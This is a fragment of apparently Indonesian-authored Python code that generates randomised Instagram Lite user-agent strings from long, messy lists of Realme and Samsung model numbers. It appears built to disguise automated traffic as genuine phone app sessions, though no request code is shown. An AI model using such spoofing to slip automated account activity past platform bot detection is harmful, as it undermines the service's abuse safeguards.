'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; Realme; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Samsung':
                    self.android_version = random.choice(['9', '10', '11', '13', '12'])
                    self.device_model = random.choice(['samsung 19A', 'samsung a1', 'Samsung A10', 'Samsung A20', 'samsung A21', 'Samsung A33', 'Samsung A4', 'samsung A5', 'Samsung A50', 'Samsung A51', 'Samsung A52s', 'samsung A56', 'Samsung A7', 'samsung A7', 'Samsung A70', 'SAMSUNG A800F', 'SM-W750V', 'Trident/7.0', 'Trident/7.0', 'Samsung Chrome 11 (3180)', 'Samsung Chromebook Pro', 'Samsung Chromebook 3', 'Samsung Chromebook Plus (V2)', 'SAMSUNG F12', 'Samsung F41', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800D', 'GT-I5800', 'GT-I5800', 'SAMSUNG SM-A716S', 'SM-A015F', 'SM-A015M', 'SM-A013M', 'SM-A013F', 'SM-A013G', 'SM-A022F', 'SM-A022M', 'SM-S124DL', 'SM-A025V', 'SM-A025G', 'SM-A025F', 'SM-A025U', 'SM-A025M', 'SM-A025F', 'SAMSUNG SM-A035G', 'SM-A035M', 'SM-A035F', 'SAMSUNG SM-A035M', 'SM-A032F', 'SM-A032M', 'SM-A037U', 'SM-A037U1', 'SM-S134DL', 'SAMSUNG SM-A037F', 'SM-A037M', 'SM-A045M', 'SM-A045F', 'SAMSUNG SM-A045F', 'SM-A042F', 'SM-A042M', 'SAMSUNG SM-A042F', 'SM-A047F', 'SAMSUNG SM-A047F', 'SM-A105FN', 'SAMSUNG SM-A105FN', 'SM-A105G', 'SM-A105M', 'U', 'SM-S102DL', 'SM-A102U', 'SAMSUNG SM-A102U', 'SAMSUNG SM-A102U1', 'SM-A107M', 'SM-A107F', 'SM-A107F', 'SM-A115F', 'SM-S115DL', 'SM-A115M', 'SM-A115F', 'SAMSUNG SM-A125F', 'SM-A127F', 'SM-A125U', 'SM-A137F', 'SM-A135F', 'SM-A135U1', 'SAMSUNG SM-A135F', 'SAMSUNG SM-A137F', 'SM-A135M', 'SM-A136U', 'SM-S136DL', 'SM-A136W', 'SM-A136B', 'SM-A145R', 'SAMSUNG SM-A145R/A145RXXU1AWD1', 'SM-A145F', 'SM-A145P', 'SAMSUNG SM-A145F', 'SM-A146U', 'SM-A146P', 'SM-A146U1', 'SAMSUNG SM-A146U', 'SM-A260G', 'SM-A260F', 'SM-A260F', 'SM-A205U', 'SAMSUNG SM-A205U1', 'SM-A205F', 'SM-A205W', 'SM-A205G', 'SM-S205DL', 'SM-A205GN', 'SM-A202F', 'SAMSUNG SM-A202F', 'SM-A207F', 'SM-A207M', 'SM-S215DL', 'SM-A215U1', 'SAMSUNG SM-S215DL', 'SM-A102J', '720x1448', 'SC-42A', 'SM-A217F', 'SAMSUNG SM-A217F', 'SM-A217M', 'U', 'SM-A225F', 'SM-A225M', 'SAMSUNG SM-A225F', 'SAMSUNG SM-A226B', 'SM-A226BR', 'SM-A235F', 'SM-A235N', 'SM-A236B', 'SM-A236E', 'SM-A236U', 'SAMSUNG SM-A236M', 'SAMSUNG SM-A236U1', 'SM-A236V', 'SM-A245F', 'SAMSUNG SM-A245F', 'SM-A245M', 'Samsung Galaxy A24', 'SM-A300FU', 'SM-A300H', 'SM-A310F', 'SAMSUNG SM-A310F', 'SM-A310F', 'SM-A310M', 'SM-A320F', 'SM-A320FL', 'SAMSUNG SM-A320FL', 'SM-A305FN', 'SM-A305GN', 'SM-A305N', 'SM-A305GT', 'Flow', 'SM-A307FN', 'SM-A307GT', 'SM-A307GN', 'SM-A315G', 'SM-A315F', 'SM-A315N', 'SM-A325F', 'SM-A325M', 'SAMSUNG SM-A325F', 'SM-A326W', 'SM-A326U', 'SM-A326B', 'SAMSUNG SM-A326B', 'SM-S326DL', 'SM-A336B', 'SAMSUNG SM-A336E', 'SM-A336M', 'SM-A336N', 'SM-A346B', 'SM-A346M', 'SAMSUNG SM-A346M', 'SM-A3460', 'SM-A346E', 'SAMSUNG SM-A346B/A346BXXU1AWB9', 'SAMSUNG SM-A346E', 'SAMSUNG SM-A430F', 'SM-A405FN', 'SAMSUNG SM-A405FN', 'SM-A405FN', 'SM-A405FN/DS', 'SM-A405S', 'SM-A3050', 'SM-A3051', 'SM-A3058', 'SM-A415F', 'SC-41A', 'SM-A4260', 'SM-A426U', 'SM-A426U1', 'SM-A426U', 'SM-A426B', 'SAMSUNG SM-A426B/A426BXXU4DVL3', 'SM-A426N', 'SAMSUNG SM-A426U', 'SM-A5009', 'SM-A500YZ', 'SM-A500W', 'SM-A500L', 'SAMSUNG SM-A500W', 'SAMSUNG SM-A500L', 'SM-A500X', 'SM-A500XZ', 'SM-A500XZ', 'SM-A500XZ', 'SM-A510F', 'SAMSUNG SM-A510F', 'SM-A510F', 'SM-A520F', 'SAMSUNG SM-A520F', 'SM-A520K', 'SM-A500M', 'SM-A500H', 'SM-A500F', 'SM-A500F', 'SM-A500FU', 'SM-A505FN', 'SM-A505G', 'SM-A505FM', 'SM-A505U', 'SM-A507FN', 'SM-A515F', 'SM-A515F', 'SM-A515U', 'SM-A516U', 'SM-A516B', 'SM-A516B/DS', 'SM-A516N', 'SC-54A', 'SM-A516V', 'SCG07', 'SM-A525F', 'SAMSUNG SM-A525F', 'SM-A525M', 'SAMSUNG SM-A526B', 'SM-A526W', 'SM-A526U', 'SM-A5260', 'SM-A528B', 'SAMSUNG SM-A528B', 'SAMSUNG SM-A528B/A528BXXU3EWE1', 'SM-A536E', 'SM-A536B', 'SAMSUNG SM-A536E', 'SM-A5360', 'SM-A536U', 'SM-A536U1', 'SM-A536V', 'SAMSUNG SM-A536V', 'SM-A546U1', 'SM-A546E', 'SM-A546B', 'SM-A5460', 'SAMSUNG SM-A546U', 'SM-A546W', 'SM-A546V', 'SAMSUNG SM-A600FN', 'SM-A600G', 'SM-A605FN', 'SM-A605G', 'SM-A6050', 'SM-A605GN/DS', 'SAMSUNG SM-A605FN', 'SM-A6060', 'SM-A606Y', 'SAMSUNG SM-A606Y', 'SM-G6200', 'SM-G6200', 'SM-A7000', 'SM-A700FD', 'SM-A700K', 'SM-A700H', 'SM-A700YD', 'SM-A710F', 'SM-A7100', 'SM-A710K', 'SM-A710M', 'SM-A720F', 'SM-A750FN', 'SAMSUNG SM-A750FN', 'SM-A750N', 'SM-A750GN', 'SM-A705FN', 'SM-A705MN', 'SM-A705GM', 'SM-A705W', 'SM-A707F', 'SAMSUNG SM-A707F', 'SAMSUNG SM-A7070', 'SM-A715F', 'SM-A715W', 'SM-A715F', 'SM-A715F', 'SM-A716U', 'SM-A716U1', 'SAMSUNG SM-A716U', 'SM-A716V', 'SAMSUNG SM-A716U1', 'SM-A725F', 'SM-A725M', 'SAMSUNG SM-A725F', 'SAMSUNG SM-A736B', 'SM-A736B', 'SM-A530F', 'SAMSUNG SM-A530F', 'SM-A8000', 'SM-A810F', 'SM-A810YZ', 'SAMSUNG SM-A810YZ', 'SM-A810S', 'SM-A530N', 'SM-A530W', 'SAMSUNG SM-A530W', 'SAMSUNG SM-G885F', 'SM-G885Y', 'SAMSUNG SM-G885S', 'SAMSUNG SM-G885Y', 'samsung SM-G885F', 'SM-A730F', 'SM-A805F', 'SAMSUNG SM-A805F', 'SM-A8050', 'SM-A805N', 'SM-G8870', 'SM-G887F', 'SM-A8s', 'SAMSUNG SM-G8870', 'SM-A9000', 'SM-A920F', 'SAMSUNG SM-A920F/A920FXXS7CVI7', 'U', 'SM-A910F', 'SM-G887N', 'SM-G887N', 'SM-A910F', 'SM-A9100', 'SM-G8850', 'SAMSUNG SM-G8850', 'SM-G8858', 'SM-G8850', 'SAMSUNG SM-A908B', 'SM-A908N', 'SAMSUNG SM-A908B/A908BXXU5EVK3', 'SAMSUNG SM-A908B/A908BXXU5EVG6', 'SAMSUNG SM-A9080', 'SM-A9080', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830M', 'GT-S5830i', 'GT-S5830i', 'GT-S5830L', 'GT-S5830G', 'GT-S5830M', 'GT-S5830M', 'GT-S5830C', 'GT-S5830V', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'GT-I8160P', 'GT-I8160', 'GT-I8160P-ORANGE/I8160PBVLK3', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'SAMSUNG GT-I8160/I8160BOLK2', 'SAMSUNG GT-S7275R/S7275RXXUAMK2', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275R', 'SAMSUNG GT-S7275R-ORANGE', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275B', 'GT-S7275B', 'GT-S7275B', 'GT-S7275T', 'GT-S7275Y', 'SM-G313HY', 'SM-G313MY', 'SM-G313MU', 'SM-G316MY', 'SM-G316M', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G313HZ', 'SM-G313HU', 'SM-G313U', 'SM-G318H', 'GT-S7500', 'GT-S7500', 'SAMSUNG GT-S7500/S7500BUMB1', 'GT-S7500', 'GT-S7500', 'GT-S7500T', 'GT-S7500', 'GT-S7500W', 'GT-S7500T', 'GT-S7500L', 'GT-S7500L', 'GT-S7500T', 'GT-S7500L', 'GT-S7500T', 'SM-G357FZ', 'SM-G310HN', 'SAMSUNG SM-G357FZ/G357FZXXU1AOE1', 'SM-G357FZ', 'SC-01H', 'SC-01H', 'SM-G850F', 'SM-G850F', 'SM-G850M', 'SAMSUNG-SM-J327AZ', 'SAMSUNG SM-J327AZ', 'SM-J337AZ', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'SM-G386T', 'SM-G386T1', 'SM-G386T1', 'SAMSUNG SM-G386T', 'SM-G386T', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'SM-G3858', 'SM-G3858', 'SAMSUNG-SM-G3858_TD/1.0 Android/4.2.2 Release/10.15.2013 Browser/AppleWebKit534.30', 'SM-G3858', 'SM-G3858', 'SM-G3858', 'SM-A226L', 'SAMSUNG SM-A226L', 'SM-M236L', 'SAMSUNG SM-M236L', 'SM-C5000', 'SAMSUNG SM-C5000', 'SAMSUNG SM-C500X', 'SM-C5010', 'SAMSUNG SM-C5010', 'SAMSUNG SM-C5018', 'SM-C7000', 'SAMSUNG SM-C7000', 'SM-C7000', 'SM-C7010', 'SM-C701F', 'SAMSUNG SM-C7010', 'SAMSUNG SM-C701F', 'SM-C7018', 'SAMSUNG SM-C7100', 'SM-C7108', 'SAMSUNG SM-C7108', 'SM-C9000', 'SM-C900F', 'SM-C900Y', 'EK-GC100', 'EK-GC100', 'EK-GC100', 'EK-GC120', 'EK-GC200', 'EK-GC200', 'EK-GC110', 'EK-GC110', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330B', 'GT-B5330B', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330L', 'GT-I8262', 'GT-I8262', 'GT-I8262', 'GT-I8260', 'GT-I8262', 'GT-I8262B', 'GT-I8262D', 'GT-I8262D', 'GT-I8262B', 'SM-G355H', 'SM-G355M', 'SHW-M570S', 'SAMSUNG GT-I8580', 'SHW-M570S', 'SAMSUNG SHW-M570S', 'GT-I8580', 'GT-I8580', 'GT-I8580', 'SAMSUNG GT-I8580', 'SM-G3589W', 'SM-G3589W', 'SM-G3589W', 'SAMSUNG-SM-G3589W', 'SM-G386W', 'SM-G386F', 'SM-G3518', 'SM-G3586V', 'SM-G3586V', 'SM-G3518', 'SM-G3518', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G3568V', 'SM-G3568V', 'SM-G350E', 'SM-G350', 'SM-G3509I', 'SM-G3508J', 'SM-G3502I', 'SM-G3502C', 'SM-G360BT', 'SM-S820L', 'SM-G360H', 'SM-G360F', 'SM-G360T', 'SM-G360M', 'SM-G361H', 'SM-G361F', 'SM-G361HU', 'SAMSUNG SM-G361H', 'SCH-R740C', 'SGH-S730M', 'SGH-S730G', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SM-E500H', 'SM-E500F', '720x1280', 'SM-E500M', 'SM-E5000', 'SM-E500YZ', 'SM-E700H', 'SM-E700F', 'SM-E7009', 'SM-E700M', 'GT-I8730', 'GT-I8730', 'GT-i8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730T', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCOE1', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCNH1', 'SM-E025F', 'SM-F127G', 'SM-E135F', 'SM-E225F', 'SM-E236B', 'SAMSUNG SM-E236B', 'SM-F415F', 'SM-E426B', 'SAMSUNG SM-E426B', 'SM-E5260', 'SAMSUNG SM-E5260', 'SM-E625F', 'GT-S6810M', 'GT-S6810', 'GT-S6810P', 'GT-S6810B', 'GT-S6810L', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810E', 'GT-S6810M', 'GT-S6810P', 'GT-S6812C', 'GT-S6812', 'GT-S6812i', 'GT-S6812i', 'GT-S6812C', 'GT-S6812i', 'GT-S6812i', 'GT-S6812i', 'GT-S6812B', 'GT-S6812i', 'GT-S6812B', 'GT-S6812B', 'GT-S6790L', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790L', 'SC-04J', 'SC-02L', 'SM-F907B', 'SM-F900U', 'SM-F900F', 'SM-F907N', 'SM-F9000', 'SM-F900U1', 'SM-F900W', 'SM-G150NL', 'SM-G155S', 'SM-G150N0', 'SM-G150NS', 'SM-G1650', 'SM-W2015', 'SM-W2015', 'SAMSUNG-SM-W2015', 'GT-I9128I', 'GT-I9128I', 'GT-I9128E', 'SM-G7102', 'SM-G7102', 'SM-G7105', 'SM-G7106', 'SM-G7108', 'GT-I9082', 'GT-I9082', 'GT-I9082C', 'SM-G7202', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G7200', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G720N0', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G720N0', 'SM-G7202', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9168I', 'GT-I9168I', 'SAMSUNG-GT-I9168_TD Release/1.15.2014 Browser/AppleWebKit/534.30', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'SM-G531F', 'SM-G531H', 'SM-G530T', 'SM-G530H', 'SM-G530BT', 'SM-G530FZ', 'SM-G532F', 'SM-G531M', 'SM-G531BT', 'SAMSUNG-SM-J727AZ', 'SM-J100FN', 'SM-J100H', 'SM-J120H', 'SM-J120F', 'SM-J120FN', 'SM-J120H', 'SM-J111F', 'SM-J111M', 'SM-J110H', 'SM-J111M', 'SM-J110G', 'SM-J110F', 'SM-J105B', 'SM-J105H', 'SM-J105Y', 'SM-J106F', 'SM-J106H', 'SM-J106B', 'SM-J106M', 'SM-J200GU', 'SM-J200F', 'SM-J200M', 'SM-J200H', 'SM-J260F', 'SM-J260M', 'SM-J260G', 'SM-J260FU', 'SM-J260MU', 'SM-J260Y', 'SM-J200BT', 'SAMSUNG SM-J200BT', 'SM-G532G', 'SM-G532M', 'SM-G532MT', 'SM-J250G', 'SM-J250M', 'SM-J250F', 'SM-J250Y', 'SAMSUNG SM-J260AZ', 'SM-J3109', 'SM-J320Y', 'SM-J320H', 'SM-J320G', 'SM-J320FN', 'SM-J320V', 'SM-J320M', 'SAMSUNG-SM-J320A', 'SM-J330FN', 'SAMSUNG SM-J330F', 'SAMSUNG SM-J330FN/J330FNXXS4CUD3', 'SM-J330G', 'SM-J337P', 'SM-J337V', 'SAMSUNG SM-J337W', 'SM-J337U', 'SM-J337VPP', 'SM-J337R4', 'SM-J327V', 'SM-J327P', 'SM-J327R4', 'SM-S327VL', 'SM-S337TL', 'SAMSUNG SM-S327VL', 'SM-J327VPP', 'SM-S367VL', 'SAMSUNG SM-S367VL', 'SM-S357BL', 'SM-J327T1', 'SM-J3110', 'SM-J3119S', 'SAMSUNG-SM-J3119', 'SM-S320VL', 'SM-J337T', 'SM-J400F', 'SM-J400M', 'SM-J400G', 'SM-J400M', 'SM-J410F', 'SM-J410G', 'SM-J410F', 'SM-J410F', 'SM-J410F', 'SM-J415FN', 'SM-J415GN', 'Galaxy j5', 'SM-J500M', 'SM-J500G', 'SM-J500F', 'SM-J500H', 'SM-J500FN', 'SM-J510H', 'SM-J510FQ', 'SM-J510FN', 'SM-J510MN', 'SM-J510MN', 'SM-J510GN', 'SM-J530F', 'SAMSUNG SM-J530F/J530FXXS9CUE5', 'SM-G570M', 'SM-G570F', 'SM-G570Y', 'SM-J530Y', 'SAMSUNG SM-J530G', 'SM-J600FN', 'SM-J600GT', 'SM-J610FN', 'SM-J610F', 'SM-J610G', 'SM-J710F', 'SM-J700M', 'SM-J700H', 'SM-J710MN', 'SM-J710K', 'SM-J7108', 'SM-J700F', 'SM-J700P', 'SM-J710GN', 'SM-J700T', 'SM-J700T1', 'SAMSUNG SM-J727A', 'SM-J730K', 'SM-J727R4', 'SM-J727S',\
                                                        'SM-J727U', 'SM-J737T1', 'SM-J737A', 'SM-J737V', 'SAMSUNG SM-J737U', 'SM-J737R4', 'SM-J737S', 'SM-J737P', 'SM-J701F', 'SM-J701MT', 'SM-S767VL', 'SM-S757BL', 'SAMSUNG SM-S767VL', 'SM-J720F', 'SM-J720M', 'SM-G615F', 'SAMSUNG SM-G615F', 'SM-G615FU', 'SM-G615F', 'SM-G610F', 'SM-G610M', 'SM-G610Y', 'SM-G611MT', 'SM-G611FF', 'SM-G611FF', 'SM-J730G', 'SM-J730F', 'SM-J730FM', 'SM-S727VL', 'SM-S737TL', 'SAMSUNG SM-S727VL', 'SAMSUNG SM-J727T1', 'U', 'SM-J727V', 'SM-J727P', 'SM-J727VPP', 'SM-C710F', 'SAMSUNG SM-C710F', 'SM-J810F', 'SM-J810Y', 'SM-J810M', 'SM-J810G', 'SM-J810M', 'SM-J8 Plus', 'SM-J8 Pro', 'SM-J8 Pro', 'SM-J8 Pro[9]', 'SM-J8 Pro [9]', 'SM-A605K', 'SAMSUNG SM-A605K/KKS3CVH2', 'SAMSUNG SM-A605K/KKU1ARG2', 'SAMSUNG SM-A605K/KKU3CTF2', 'SM-A202K', 'SAMSUNG SM-A202K/KKS8CWA1', 'SAMSUNG SM-M336K/KSU4CWD2', 'SAMSUNG SM-M336K/KSU4CWB3', 'SAMSUNG SM-M336K/KSU3BWA2', 'SM-A326K', 'SAMSUNG SM-A326K/KSS4DWC5', 'SAMSUNG SM-A326K/KSU3CVK5', 'SAMSUNG SM-A326K/KSU4DWB7', 'SAMSUNG SM-A326K/KSS3BVI2', 'SM-C115', 'SM-C115L', 'SM-C1158', 'SAMSUNG-SM-C1158_TD Android/4.4.2 Release/04.15.2014 Browser/AppleWebKit537.36', 'SM-C115W', 'SM-C115M', 'SM-S120VL', 'SAMSUNG SM-S120VL', 'SM-M015G', 'SM-M015F', 'SAMSUNG SM-M015G', 'SAMSUNG SM-M015F', 'SM-M013F', 'SAMSUNG SM-M013F', 'SM-M017F', 'SAMSUNG SM-M017F', 'SM-M022F', 'SM-M022G', 'SM-M025F', 'SM-M025F/DS', 'SM-E045F', 'SM-M045F', 'SM-M105M', 'SM-M105F', 'SM-M105G', 'SM-M107F', 'SAMSUNG SM-M107F', 'SM-M115F', 'SM-M127F', 'SM-M127G', 'SM-M135F', 'SAMSUNG SM-M135F', 'SM-M135FU', 'SM-M135M', 'SM-M136B', 'SAMSUNG SM-M136B', 'SM-M146B', 'SAMSUNG SM-M146B', 'SM-M205F', 'SM-M205M', 'SM-M205FN', 'SM-M205F', 'SM-M215F', 'SM-M215G', 'SAMSUNG SM-M215G', 'SM-M225FV', 'SAMSUNG SM-M225FV', 'SM-M236B', 'SAMSUNG SM-M236B', 'SM-M305F', 'SM-M305M', 'SM-M305M/DS', 'SM-M305F', 'SM-M307F', 'SM-M307FN', 'SM-M3070', 'SM-M307F', 'SM-M315F', 'SM-M315F/DS', 'SM-M317F', 'SAMSUNG SM-M317F', 'SM-M317F/DSN', 'SM-M325FV', 'SAMSUNG SM-M325FV', 'SM-M326B', 'SAMSUNG SM-M326B', 'SM-M336BU', 'SAMSUNG SM-M336B', 'SM-M405F', 'SAMSUNG SM-M405F', 'SM-M426B', 'SM-M515F', 'SM-M515F/DSN', 'SM-M526BR', 'SM-M536B', 'SAMSUNG SM-M536B', 'SM-M536B', 'SM-M625F', 'SM-M625F/DS', 'SAMSUNG SM-M625F', 'SGH-I527M', 'SM-G750H', 'SM-G7508Q', 'SM-G7509', 'SAMSUNG-SM-G750A', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'SM-N970U', 'SM-N9700', 'SM-N970F', 'SM-N970U', 'SM-N971N', 'SM-N770F', 'SAMSUNG SM-N770F', 'SM-N975U', 'SM-N975F', 'SM-N975U1', 'SAMSUNG SM-N976B/N976BXXS8HWC5', 'SM-N976U', 'SM-N976N', 'SGH-I317M', 'Samsung Galaxy Note 2', 'SM-N980F', 'SAMSUNG SM-N980F', 'SAMSUNG SM-N981B', 'SM-N9810', 'SM-N981U', 'SM-N981N', 'SM-N985F', 'SAMSUNG SM-N985F', 'SM-N986U1', 'SM-N986B', 'SAMSUNG SM-N986B', 'SAMSUNG SM-N986U', 'SM-N986N', 'SM-N9008V', 'SM-N9006', 'SAMSUNG-SM-N900A', 'SM-N9005', 'SM-N900W8', 'Samsung GALAXY Note 3', 'SM-N900L', 'SM-N9009', 'SM-N900T', 'SM-N900P', 'SM-N9000Q', 'SAMSUNG SM-N9002', 'SM-N9002', 'SAMSUNG SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-9005', 'SM-9005', 'SM-N750L', 'SM-N7505', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SM-N9100', 'SM-N910C', '1440x2560', 'SM-N910V', 'SM-N910H', 'SM-N910U', 'SM-N9108V', 'SM-N915FY', 'SM-N915T', 'SM-N9150', 'SM-N915G', 'SM-N915A', 'SM-N915S', 'SM-N915D', 'SM-N915W8', 'SM-N916L', 'SM-N916S', 'SM-N916K', 'SM-N916LSK', 'SM-N920C', 'SM-N920L', 'SAMSUNG SM-N920C', 'SAMSUNG-SM-N920A', 'SM-N920K', 'SM-N920S', 'SM-N920G', 'SM-N920V', 'SM-N920I', 'SM-N9208', 'SM-N930F', 'SM-N9300', 'SM-N930x', 'SM-N930P', 'SM-N930X', 'SM-N930W8', 'SM-N930V', 'SM-N930T', 'SM-N9500', 'SM-N950U', 'SM-N950F', 'SM-N950N', 'SAMSUNG SM-N950F', 'SM-N960U', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960W', 'SC-01G', 'SCL24', 'SAMSUNG SCL24', 'SM-N935S', 'SM-N935F', 'SM-N935K', 'SM-N935L', 'N7100', 'GT-N7100', 'SAMSUNG GT-N7100', 'GT-N7100', 'GT-N7105', 'GT-N7105T', 'SAMSUNG GT-N7105/N7105XXDMC3', 'GT-N7105T', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'Galaxy Note N8000', 'Galaxy Note20', 'SAMSUNG EK-GN120', 'SM-G550T', 'SM-G5500', 'SM-G550FY', 'SM-G5510', 'SM-G550T1', 'SM-S550TL', 'SM-G5528', 'SM-G5528', 'SM-G600FY', 'SM-G600F', 'SM-G6000', 'SM-G6100', 'SM-G610S', 'SM-G611F', 'SM-G611L', 'SM-G611S', 'SAMSUNG SM-J710FN', 'P1 Galaxy Plus', 'SM-G110M', 'SM-G110H', 'SM-G110B', 'SM-G110H', 'SM-G110H', 'GT-S5310', 'GT-S5310I', 'GT-S5310C', 'GT-S5310B', 'GT-S5310T', 'GT-S5310G', 'GT-S5310E', 'GT-S5310E', 'GT-S5310L', 'GT-S5310G', 'GT-S5310', 'GT-S5310G', 'GT-S5301B', 'GT-S5301B', 'Gt-s5301b', 'GT-S5301B', 'GT-S5301', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'SAMSUNG GT-S5301/S5301XXAMA3', 'GT-S5301B', 'GT-S5301L', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510L', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510', 'SM-A826S', 'SAMSUNG SM-A826S', 'SAMSUNG SM-M536S', 'SM-G910S', 'SM-G910S', 'SM-G910S', 'SAMSUNG SM-G910S', 'GT-I9000', 'GT-I9000', 'GT-I9088', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9008', 'GT-i9008', 'GT-I9000', 'GT-I9000', 'GT-I9000B', 'GT-I9000M', 'GT-I9000', 'GT-I9070', 'GT-I9070', 'GT-I9070', 'GT-I9070P', 'GT-I9070P', 'SAMSUNG GT-I9070/I9070BULK1', 'GT-I9070', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562L', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 